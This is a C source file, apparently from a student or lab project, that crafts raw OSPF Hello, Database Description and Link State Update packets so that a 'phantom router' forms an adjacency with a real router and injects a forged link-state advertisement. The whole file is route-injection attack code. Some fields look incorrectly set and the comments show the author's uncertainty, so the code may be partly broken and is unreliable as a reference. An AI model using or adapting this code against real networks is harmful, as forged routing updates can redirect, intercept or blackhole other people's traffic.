#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <linux/if_ether.h>
#include <netpacket/packet.h>
#include <net/ethernet.h>
#include <netinet/ether.h>
#include <netinet/ip.h>
#include <arpa/inet.h>

#include "checksum.h"
#include "ospf.h"
#include "ospf_attack.h"
#include "utils.h"

// "Private methods" for the attack, declared here so that we can reference them
// at any part of this file instead of having to declare the method first
int ospf_write_header(unsigned char *buffer, char *local_ip, int ospf_len, unsigned char packet_type);
int ospf_write_hello(unsigned char *buffer, char *router_ip);
int ospf_write_db_description(unsigned char* buffer, unsigned long sequence_number, __u8 control);
int ospf_write_ls_update(unsigned char *buffer, char *local_ip);
int ospf_write_lss_data_block(unsigned char *buffer);

// Writes an OSPF Hello Packet on the buffer and returns the total amount of
// bytes that should be sent over the network
int attack_write_hello(unsigned char buffer[BUFFER_LEN], unsigned char *local_mac, char *local_ip, char *router_ip) {
  // Ethernet header
  unsigned char *dest_mac = parse_mac_addr(IPV4_MULTICAST_MAC);
  int ether_header_len = write_ipv4_ethernet_header(buffer, local_mac, dest_mac);

  // Position on the buffer where we should begin writing OSPF data
  int ospf_packet_offset = ether_header_len + sizeof(struct ip);
  unsigned char *ospf_buffer_ptr = buffer + ospf_packet_offset;

  // OSPF sections of the packet
  int ospf_len = 0;
  ospf_len += ospf_write_hello(ospf_buffer_ptr + sizeof(struct ospf_header), router_ip);
  ospf_len += ospf_write_header(ospf_buffer_ptr, local_ip, sizeof(struct ospf_hello), OSPF_HELLO_T);
  ospf_len += ospf_write_lss_data_block(ospf_buffer_ptr + ospf_len);

  // IP header
  int ip_header_len = write_ipv4_header(buffer + ether_header_len, local_ip, IPV4_MULTICAST_ADDR, ospf_len);

  return ether_header_len + ip_header_len + ospf_len;
}

// Writes an OSPF DB Description Packet on the buffer and returns the total amount
// of bytes that should be sent over the network
int attack_write_db_description(unsigned char buffer[BUFFER_LEN], unsigned char *local_mac, char *local_ip, char *router_ip, __u32 sequence_number, __u8 control) {
  // Ethernet header
  unsigned char *dest_mac = parse_mac_addr(ROUTER_MAC);
  int ether_header_len = write_ipv4_ethernet_header(buffer, local_mac, dest_mac);

  // Position on the buffer where we should begin writing OSPF data
  int ospf_packet_offset = ether_header_len + sizeof(struct ip);
  unsigned char *ospf_buffer_ptr = buffer + ospf_packet_offset;

  // OSPF sections of the packet
  int ospf_len = 0;
  ospf_len += ospf_write_db_description(ospf_buffer_ptr + sizeof(struct ospf_header), sequence_number, control);
  ospf_len += ospf_write_header(ospf_buffer_ptr, local_ip, sizeof(struct ospf_dd), OSPF_DATADESC_T);
  ospf_len += ospf_write_lss_data_block(ospf_buffer_ptr + ospf_len);

  // IP header
  int ip_header_len = write_ipv4_header(buffer + ether_header_len, local_ip, router_ip, ospf_len);

  return ether_header_len + ip_header_len + ospf_len;
}

int attack_write_ls_update(unsigned char buffer[BUFFER_LEN], unsigned char *local_mac, char *local_ip, char *router_ip) {
  // Ethernet header
  unsigned char *dest_mac = parse_mac_addr(IPV4_MULTICAST_MAC);
  int ether_header_len = write_ipv4_ethernet_header(buffer, local_mac, dest_mac);

  // Position on the buffer where we should begin writing OSPF data
  int ospf_packet_offset = ether_header_len + sizeof(struct ip);
  unsigned char *ospf_buffer_ptr = buffer + ospf_packet_offset;

  // OSPF sections of the packet
  int ospf_len = 0;
  ospf_len += ospf_write_ls_update(ospf_buffer_ptr + sizeof(struct ospf_header), local_ip);
  ospf_len += ospf_write_header(ospf_buffer_ptr, local_ip, ospf_len, OSPF_LSUPDATE_T);

  // IP header
  int ip_header_len = write_ipv4_header(buffer + ether_header_len, local_ip, router_ip, ospf_len);

  return ether_header_len + ip_header_len + ospf_len;
}

/******************************************************************************
 * Methods for building parts of OSPF packets
 ******************************************************************************/

int ospf_write_header(unsigned char *buffer, char *local_ip, int ospf_data_len, unsigned char packet_type) {
  int total_len = ospf_data_len + sizeof(struct ospf_header);

  struct ospf_header *header = (struct ospf_header *) buffer;
  header->ospf_version = OSPF_VERSION;       /* Version Number       */
  header->ospf_type = packet_type;           /* Packet Type          */
  header->ospf_len = htons(total_len);       /* Packet Length        */
  header->ospf_rid = inet_addr(local_ip);    /* Router Identifier    */
  header->ospf_aid = inet_addr("0.0.0.0");   /* Area Identifier      */
  header->ospf_cksum = 0x0000;               /* Check Sum            */
  header->ospf_authtype = AU_NONE;           /* Authentication Type  */
  header->ospf_auth = 0;                     /* Authentication Field */

  header->ospf_cksum = in_cksum((short unsigned int *)buffer, total_len);

  return sizeof(struct ospf_header);
}

int ospf_write_hello(unsigned char *buffer, char *router_ip) {
  struct ospf_hello *hello = (struct ospf_hello *) buffer;
  hello->oh_netmask = inet_addr("255.255.255.0"); /* Network Mask     */
  hello->oh_hintv = OSPF_HELLO_INTERVAL;          /* Hello Interval (seconds) */
  hello->oh_opts = OSPF_HELLO_OPTIONS;            /* Options      */
  hello->oh_prio = OSPF_HELLO_PRIORITY;           /* Sender's Router Priority */
  hello->oh_rdintv = inet_addr("0.0.0.40");       /* Seconds Before Declare Dead  */
  hello->oh_drid = inet_addr(router_ip);          /* Designated Router ID   */
  hello->oh_brid = inet_addr("0.0.0.0");          /* Backup Designated Router ID  */
  hello->oh_neighbor = inet_addr(router_ip);      /* Living Neighbors   */

  return sizeof(struct ospf_hello);
}

int ospf_write_db_description(unsigned char* buffer, unsigned long sequence_number, __u8 control) {
  struct ospf_dd *database_description_header_ospf = (struct ospf_dd *) buffer;
  database_description_header_ospf->dd_mbz = htons(1500);                   /* Must Be Zero         */
  database_description_header_ospf->dd_opts = DD_OPTIONS;                   /* Options          */
  database_description_header_ospf->dd_control = control;                   /* Control Bits (DDC_* below)   */
  database_description_header_ospf->dd_seq = htonl(sequence_number);        /* Sequence Number      */

  return sizeof(struct ospf_dd);
}

int ospf_write_ls_update(unsigned char *buffer, char *local_ip) {
  int length = 0;
  // OSPF Link State Update
  struct ospf_lsu *lsu_header_ospf = (struct ospf_lsu *) buffer;
  lsu_header_ospf->lsu_nads = htonl(1); /* # Advertisments This Packet  */
  length += sizeof(struct ospf_lsu);

  // OSPF link state summary header
  struct ospf_lss *lss_header_ospf = (struct ospf_lss *) (buffer + length);
  lss_header_ospf->lss_age = htons(LSS_AGE);                                /* Time (secs) Since Originated */
  lss_header_ospf->lss_opts = LSS_OPTIONS;                                  /* Options Supported */
  lss_header_ospf->lss_type = LSST_ROUTE;                                   /* LST_* below ?pedro */
  lss_header_ospf->lss_lsid = inet_addr(local_ip);                          /* Link State Identifier */
  lss_header_ospf->lss_rid = inet_addr(local_ip);                           /* Advertising Router Identifier ?pedro I think would was THE PHANTOM ROUTER*/
  lss_header_ospf->lss_seq = LSS_SEQ_NUM;                                   /* Link State Adv. Sequence #   */
  lss_header_ospf->lss_cksum = 0x0000;                                      /* Fletcher Checksum of LSA */
  lss_header_ospf->lss_len = LSS_LENGTH;                                    /* Length of Advertisement ?pedro I don't know, because in wireshark a header has 3 LSS and values not equal*/
  length += sizeof(struct ospf_lss);

  // OSPF Network Links Advertisement
  struct  ospf_na *na_header_ospf = (struct ospf_na *) (buffer + length);
  na_header_ospf->na_mask = inet_addr("255.0.0.0");                         /* Network Mask     */
  na_header_ospf->na_rid[0] = inet_addr("200.0.0.1");                       /* ID of first  Attached Routers  */
  na_header_ospf->na_rid[1] = inet_addr("100.0.0.1");                       /* ID of second Attached Routers  */
  length += sizeof(struct ospf_na);

  return length;
}

int ospf_write_lss_data_block(unsigned char *buffer) {
  struct ospf_lls *lls_header_ospf = (struct ospf_lls *) buffer;
  lls_header_ospf->data[0] = 0x0300f6ff;
  lls_header_ospf->data[1] = 0x04000100;
  lls_header_ospf->data[2] = 0x01000000;

  return sizeof(struct ospf_lls);
}
